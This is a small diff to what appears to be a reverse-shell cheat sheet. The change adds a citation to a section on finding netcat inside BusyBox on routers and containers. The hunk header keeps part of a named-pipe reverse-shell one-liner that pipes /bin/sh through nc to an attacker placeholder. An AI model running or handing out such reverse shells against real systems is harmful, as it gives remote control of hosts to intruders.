@@ -113,7 +113,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 
 ## BusyBox
 
-Very common in **routers**, **embedded devices**, **containers**, and stripped-down Linux appliances. If there is no standalone `nc`, check whether BusyBox exposes it:
+Very common in **routers**, **embedded devices**, **containers**, and stripped-down Linux appliances. If there is no standalone `nc`, check whether BusyBox exposes it:<sup>[[8]](#references)</sup>
 
 ```bash
 busybox --list-full | grep -E '(^|/)nc$'
